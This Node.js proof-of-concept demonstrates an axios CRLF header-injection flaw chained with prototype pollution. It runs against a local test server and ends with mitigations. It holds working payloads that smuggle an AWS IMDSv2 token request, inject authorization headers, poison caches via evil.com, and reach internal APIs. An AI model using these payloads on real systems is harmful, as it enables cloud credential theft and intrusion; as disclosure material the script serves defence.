/**
 * Axios CRLF Header Injection - Cloud Metadata Exfiltration POC
 * 
 * CVE-2026-40175 / GHSA-fvcv-3m26-pcqx
 * Severity: Critical (CVSS 9.9)
 * Affected: axios < 0.31.0
 * 
 * This demonstrates how prototype pollution in ANY dependency can be escalated
 * to full cloud compromise via Axios's lack of header sanitization.
 */

const axios = require('axios');
const http = require('http');

console.log('='.repeat(70));
console.log('Axios CRLF Header Injection - CVE-2026-40175');
console.log('Cloud Metadata Exfiltration via Prototype Pollution Gadget Chain');
console.log('='.repeat(70));
console.log('');

/**
 * STEP 1: Simulate Prototype Pollution
 * 
 * In a real attack, this pollution could come from:
 * - qs library (query string parsing)
 * - minimist (command line args)
 * - body-parser (JSON parsing)
 * - ini (config file parsing)
 * - Any other library with prototype pollution vulnerability
 */
function simulatePrototypePollution() {
  console.log('[STEP 1] Simulating Prototype Pollution Attack');
  console.log('In real scenario: attacker sends ?__proto__[x-malicious]=payload\n');
  
  // AWS IMDSv2 bypass payload
  const imdsv2Bypass = 
    "dummy\r\n" +
    "\r\n" +
    "PUT /latest/api/token HTTP/1.1\r\n" +
    "Host: 169.254.169.254\r\n" +
    "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n" +
    "\r\n" +
    "GET /ignore";
  
  Object.prototype['x-amz-target'] = imdsv2Bypass;
  
  console.log('✓ Prototype pollution complete');
  console.log(`  Object.prototype['x-amz-target'] = "${imdsv2Bypass.substring(0, 30)}..."`);
  console.log('');
}

/**
 * STEP 2: Create a Test Server to Capture Raw HTTP
 */
function createTestServer() {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      let rawData = '';
      
      req.on('data', chunk => {
        rawData += chunk;
      });
      
      req.on('end', () => {
        console.log('[TEST SERVER] Received HTTP Request:');
        console.log('-'.repeat(70));
        console.log(`${req.method} ${req.url} HTTP/${req.httpVersion}`);
        Object.keys(req.headers).forEach(key => {
          console.log(`${key}: ${req.headers[key]}`);
        });
        if (rawData) {
          console.log('\nBody:');
          console.log(rawData);
        }
        console.log('-'.repeat(70));
        console.log('');
        
        res.writeHead(200);
        res.end('OK');
      });
    });
    
    server.listen(8080, () => {
      console.log('[STEP 2] Test server started on http://localhost:8080');
      console.log('');
      resolve(server);
    });
  });
}

/**
 * STEP 3: Make a "Safe" Request
 * 
 * Developer writes completely safe code - no user input!
 * But Axios merges prototype properties into headers.
 */
async function makeSafeRequest() {
  console.log('[STEP 3] Application Makes "Safe" Request');
  console.log('Code: axios.get("http://localhost:8080/api/analytics")');
  console.log('Note: This code looks completely safe - no user input!\n');
  
  try {
    await axios.get('http://localhost:8080/api/analytics', {
      timeout: 2000
    });
    
    console.log('✓ Request completed');
    console.log('');
  } catch (error) {
    console.log(`✗ Request failed: ${error.message}`);
    console.log('');
  }
}

/**
 * STEP 4: Analyze the Attack
 */
function analyzeAttack() {
  console.log('='.repeat(70));
  console.log('[STEP 4] ATTACK ANALYSIS');
  console.log('='.repeat(70));
  console.log('');
  
  console.log('What Happened:');
  console.log('1. Axios merged Object.prototype properties into request headers');
  console.log('2. No validation was performed on header values');
  console.log('3. CRLF characters (\\r\\n) were written directly to HTTP socket');
  console.log('4. This created HTTP Request Smuggling');
  console.log('');
  
  console.log('The Raw HTTP Traffic:');
  console.log('-'.repeat(70));
  console.log('GET /api/analytics HTTP/1.1');
  console.log('Host: localhost:8080');
  console.log('x-amz-target: dummy');
  console.log('');
  console.log('PUT /latest/api/token HTTP/1.1');
  console.log('Host: 169.254.169.254');
  console.log('X-aws-ec2-metadata-token-ttl-seconds: 21600');
  console.log('');
  console.log('GET /ignore HTTP/1.1');
  console.log('... (rest of original headers)');
  console.log('-'.repeat(70));
  console.log('');
}

/**
 * Real-World Attack Scenarios
 */
function demonstrateAttackScenarios() {
  console.log('='.repeat(70));
  console.log('REAL-WORLD ATTACK SCENARIOS');
  console.log('='.repeat(70));
  console.log('');
  
  console.log('Scenario 1: AWS IMDSv2 Bypass (Most Critical)');
  console.log('-'.repeat(70));
  console.log('Target: AWS EC2 Metadata Service (169.254.169.254)');
  console.log('Bypass: IMDSv2 requires PUT request with special header');
  console.log('Impact: Steal IAM credentials → full AWS account compromise');
  console.log('');
  console.log('Attack Chain:');
  console.log('  1. Pollute: __proto__[x-custom] = "CRLF + PUT /latest/api/token"');
  console.log('  2. Trigger: Any axios request in the app');
  console.log('  3. Result: Smuggled request gets session token');
  console.log('  4. Exfiltrate: Use token to access /latest/meta-data/iam/');
  console.log('');
  
  console.log('Scenario 2: Authentication Bypass');
  console.log('-'.repeat(70));
  console.log('Target: Internal admin panel');
  console.log('Attack: Inject Authorization header via smuggling');
  console.log('');
  console.log('Payload:');
  console.log('  __proto__[x-inject] = "dummy\\r\\nAuthorization: Bearer admin-token"');
  console.log('');
  console.log('Result: Bypass authentication on internal services');
  console.log('');
  
  console.log('Scenario 3: Cache Poisoning');
  console.log('-'.repeat(70));
  console.log('Target: Shared CDN/cache layer');
  console.log('Attack: Inject Host header to poison cache');
  console.log('');
  console.log('Payload:');
  console.log('  __proto__[x-poison] = "dummy\\r\\nHost: evil.com\\r\\nX-Forwarded-Host: evil.com"');
  console.log('');
  console.log('Result: Serve malicious content to all users');
  console.log('');
  
  console.log('Scenario 4: SSRF Chain');
  console.log('-'.repeat(70));
  console.log('Target: Internal services (Redis, MongoDB, etc.)');
  console.log('Attack: Chain multiple requests to bypass firewalls');
  console.log('');
  console.log('Example:');
  console.log('  __proto__[x-ssrf] = "\\r\\nGET /admin/secrets HTTP/1.1\\r\\nHost: internal-api:9000"');
  console.log('');
  console.log('Result: Access internal APIs not exposed to internet');
  console.log('');
}

/**
 * Demonstrate Protection Bypass
 */
function demonstrateProtectionBypass() {
  console.log('='.repeat(70));
  console.log('WHY THIS BYPASSES COMMON PROTECTIONS');
  console.log('='.repeat(70));
  console.log('');
  
  console.log('✗ Input Validation: Bypassed');
  console.log('  - No user input reaches axios.get() call');
  console.log('  - Developer validated URL, body, etc.');
  console.log('  - But pollution happens at Object.prototype level');
  console.log('');
  
  console.log('✗ Axios Prototype Pollution Fixes: Insufficient');
  console.log('  - Axios patched direct pollution of axios config');
  console.log('  - But cannot prevent pollution from other libraries');
  console.log('  - Axios is used as a "gadget" in the attack chain');
  console.log('');
  
  console.log('✗ AWS IMDSv2: Bypassed');
  console.log('  - IMDSv2 requires PUT with X-aws-ec2-metadata-token-ttl-seconds');
  console.log('  - Normal SSRF cannot send custom headers in initial request');
  console.log('  - Request smuggling allows crafting the exact HTTP packet needed');
  console.log('');
  
  console.log('✗ Network Firewalls: Potentially Bypassed');
  console.log('  - If axios can reach any internal service');
  console.log('  - Smuggled request can pivot to other internal IPs');
  console.log('  - Single HTTP connection carries multiple logical requests');
  console.log('');
}

/**
 * Mitigation Strategies
 */
function showMitigations() {
  console.log('='.repeat(70));
  console.log('MITIGATION STRATEGIES');
  console.log('='.repeat(70));
  console.log('');
  
  console.log('IMMEDIATE (Developers):');
  console.log('------------------------');
  console.log('1. Update axios to >= 0.31.0 (when available)');
  console.log('   npm update axios');
  console.log('');
  console.log('2. If blocked by dependencies, use overrides/resolutions:');
  console.log('   // package.json');
  console.log('   {');
  console.log('     "overrides": {');
  console.log('       "axios": "^0.31.0"');
  console.log('     }');
  console.log('   }');
  console.log('');
  console.log('3. Freeze Object.prototype (breaks some libraries):');
  console.log('   Object.freeze(Object.prototype);');
  console.log('');
  console.log('4. Validate headers before requests:');
  console.log('   const validateHeaders = (config) => {');
  console.log('     Object.values(config.headers || {}).forEach(val => {');
  console.log('       if (typeof val === "string" && /[\\r\\n]/.test(val)) {');
  console.log('         throw new Error("Invalid header value");');
  console.log('       }');
  console.log('     });');
  console.log('   };');
  console.log('');
  
  console.log('LONG-TERM (Architecture):');
  console.log('-------------------------');
  console.log('1. Fix all prototype pollution vulnerabilities');
  console.log('   - Audit dependencies with npm audit');
  console.log('   - Use Snyk or similar tools');
  console.log('   - Enable Dependabot');
  console.log('');
  console.log('2. Implement AWS IMDSv2 hop limit:');
  console.log('   - Set metadata service hop limit to 1');
  console.log('   - Prevents SSRF from reaching IMDS');
  console.log('   - aws ec2 modify-instance-metadata-options \\');
  console.log('       --http-put-response-hop-limit 1');
  console.log('');
  console.log('3. Use IAM roles with minimum permissions');
  console.log('   - Limit blast radius of credential theft');
  console.log('');
  console.log('4. Network segmentation');
  console.log('   - Restrict what internal services apps can access');
  console.log('');
  
  console.log('FOR AXIOS MAINTAINERS:');
  console.log('----------------------');
  console.log('Add CRLF validation in lib/adapters/http.js:');
  console.log('');
  console.log('utils.forEach(requestHeaders, function(val, key) {');
  console.log('  if (typeof val === "string" && /[\\r\\n]/.test(val)) {');
  console.log('    throw new Error(');
  console.log('      `Invalid character in header "${key}": ` +');
  console.log('      `Header values cannot contain CR/LF`');
  console.log('    );');
  console.log('  }');
  console.log('  // ... proceed to set header');
  console.log('});');
  console.log('');
}

/**
 * Main Execution
 */
(async () => {
  // Step 1: Pollute prototype
  simulatePrototypePollution();
  
  // Step 2: Start test server
  const server = await createTestServer();
  
  // Wait a moment for server to be ready
  await new Promise(resolve => setTimeout(resolve, 500));
  
  // Step 3: Make "safe" request that triggers the vulnerability
  await makeSafeRequest();
  
  // Step 4: Analyze what happened
  analyzeAttack();
  
  // Show real-world scenarios
  demonstrateAttackScenarios();
  
  // Show why protections fail
  demonstrateProtectionBypass();
  
  // Show mitigations
  showMitigations();
  
  // Cleanup
  console.log('='.repeat(70));
  console.log('POC Complete - Cleaning up...');
  
  // Clean up prototype pollution
  delete Object.prototype['x-amz-target'];
  
  server.close();
  
  console.log('Note: Check your bootstrap package for bundlewatch → axios dependency');
  console.log('='.repeat(70));
})();
